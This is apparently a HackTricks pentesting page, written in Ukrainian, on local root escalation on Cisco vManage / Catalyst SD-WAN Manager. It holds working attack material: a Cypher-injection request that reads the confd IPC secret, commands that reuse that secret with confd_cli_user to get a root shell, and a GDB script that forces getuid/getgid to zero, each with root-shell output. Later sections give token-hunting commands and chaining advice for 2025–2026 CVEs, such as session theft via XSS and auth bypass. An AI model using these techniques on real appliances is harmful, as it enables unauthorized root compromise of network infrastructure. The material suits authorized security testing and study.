# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Після отримання code execution на Cisco vManage / *Catalyst SD-WAN Manager* як `vmanage`, `netadmin` або `vmanage-admin`, найцікавіші локальні privesc surface зазвичай — це `confd` CLI stack, helper `cmdptywrapper`, localhost REST APIs та обробники import/upload, що належать root.

Якщо вам усе ще потрібен **initial foothold** на controller, спочатку перевірте окрему сторінку control-plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
```
Якщо `/etc/confd/confd_ipc_secret` є читабельним з вашого foothold, Path 1 і Path 2 стають негайно практичними.

## Path 1

(Приклад із [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Після невеликого копання в деякій [documentation](http://66.218.245.39/doc/html/rn03re18.html), пов’язаній з `confd` та різними бінарниками (доступною з акаунтом на сайті Cisco), ми виявили, що для автентифікації IPC socket він використовує secret, розташований у `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Пам’ятаєш наш екземпляр Neo4j? Він працює з привілеями користувача `vmanage`, тож це дозволяє нам отримати файл, використовуючи попередню вразливість:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Програма `confd_cli` не підтримує аргументи командного рядка, але викликає `/usr/bin/confd_cli_user` з аргументами. Тож ми можемо напряму викликати `/usr/bin/confd_cli_user` із власним набором аргументів. Однак його не можна прочитати з нашими поточними привілеями, тому доведеться витягнути його з rootfs і скопіювати за допомогою scp, прочитати help і використати це, щоб отримати shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Блог¹ від команди synacktiv описував елегантний спосіб отримати root shell, але нюанс у тому, що він вимагає отримання копії `/usr/bin/confd_cli_user`, яку може читати лише root. Я знайшов інший спосіб підвищити привілеї до root без таких клопотів.

Коли я дизасемблював бінарний файл `/usr/bin/confd_cli`, я помітив таке:

<details>
<summary>Objdump showing UID/GID collection</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Коли я запускаю “ps aux”, я спостерігав таке (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Я припустив, що програма “confd_cli” передає user ID і group ID, які вона отримала від залогіненого користувача, до застосунку “cmdptywrapper”.

Моя перша спроба полягала в тому, щоб запустити “cmdptywrapper” напряму і передати йому `-g 0 -u 0`, але це не спрацювало. Схоже, десь по ходу роботи було створено file descriptor (-i 1015), і я не можу його підробити.

Як згадувалося в blog synacktiv(останній приклад), програма `confd_cli` не підтримує command line argument, але я можу вплинути на неї за допомогою debugger, і на щастя, GDB вже є в системі.

Я створив GDB script, у якому примусив API `getuid` і `getgid` повертати 0. Оскільки я вже маю privilege “vmanage” через deserialization RCE, у мене є право читати `/etc/confd/confd_ipc_secret` напряму.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Console Output:

<details>
<summary>Консольний вивід</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Шлях 3 (2025 CLI input validation bug - CVE-2025-20122)

Пізніше Cisco задокументувала більш чистий локальний шлях до root у своєму advisory для [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): **автентифікований attacker з лише read-only privileges** міг надіслати crafted request до manager CLI і піднятися до root через недостатню input validation.

З offensive perspective, ось важливий takeaway:

1. Щойно у вас є *будь-який* low-priv foothold на box, слід протестувати local CLI service перед тим, як переходити до більш важкого Path 1 / Path 2 workflow.
2. Повторно використовуйте artifacts з Path 2, щоб знайти trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Сприймайте кожне поле, передане до CLI backend, як suspicious: UID/GID, username, terminal metadata, imported files або будь-яке значення, яке згодом використовується root-owned helper.
4. Якщо low-priv user може дістатися local CLI socket і впливати на ці поля, root може бути лише за один crafted request.

Практичний workflow після landing на appliance такий:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Це перетворює баг 2025 року на хороший патерн для пошуку схожих версій: шукайте **local CLI shims, які збирають identity в userland і передають її до більш привілейованого wrapper**.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

У лютому 2026 Cisco також опублікувала ще один корисний клас privesc: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) дозволяв **authenticated, local attacker with low privileges** отримати root через недостатній механізм user-authentication у REST API.

Це важливо, тому що privesc у vManage більше не обмежується лише зловживанням `confd`/TTY. Після low-priv shell також шукайте:

- localhost-only API endpoints, які занадто довіряють caller
- tokens, cookies або service credentials, що читаються з поточного account
- root-only дії, доступні через `dataservice`/REST handlers, які все ще можна викликати локально

На практиці, якщо у вас уже є shell як `vmanage` або інший service user, local API abuse часто тихіший і легший для автоматизації, ніж interactive CLI abuse:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Якщо локального контексту сесії достатньо, щоб дістатися привілейованої REST-функціональності, віддавай перевагу API-шляху: його простіше replay, script, і chain зі stolen web sessions або API tokens.

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

Інший недавній pattern — [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): локальний attacker з привілеями `netadmin` міг завантажити **crafted file**, який CLI згодом unsafe обробляв, що призводило до command injection як `root`.

З точки зору HackTricks, цінна technique ширша за конкретний CVE:

1. Перелічуй кожен CLI або web workflow, що приймає file: imports, diagnostic bundles, templates, validators, backups, tenant data, etc.
2. Відстежуй, куди потрапляє uploaded file і який root-owned script або binary його споживає.
3. Перевір, чи filename, file content або parsed metadata коли-небудь передаються до shell commands, wrapper scripts або `system()`-style helpers.
4. Якщо ти вже можеш дістатися `netadmin` (valid creds, stolen session або auth-bypass chain), file-processing bugs часто є найшвидшим шляхом до root.

Цей bug class особливо добре chain-иться з remote footholds, які дають `netadmin`, але не `root`.

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

- **Authenticated UI XSS (CVE-2024-20475)** – Викрасти admin session у web UI, а потім pivot у API/CLI actions, які зрештою досягають `vshell` або одного з local privesc paths вище.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Дуже сильний precursor для Path 5, тому що `netadmin` — саме той рівень, який потрібен для 2026 crafted-file privesc.
- **Authenticated arbitrary file write (CVE-2026-20262)** – Корисно для dropping files, які згодом parsуються privileged components, або для overwriting operational artifacts, що споживаються root-owned helpers.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Краще задокументовано на dedicated SD-WAN control-plane page; воно може append SSH key для `vmanage-admin`, даючи тобі local foothold, потрібний, щоб повернутися на цю сторінку.

## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)

{{#include ../../banners/hacktricks-training.md}}
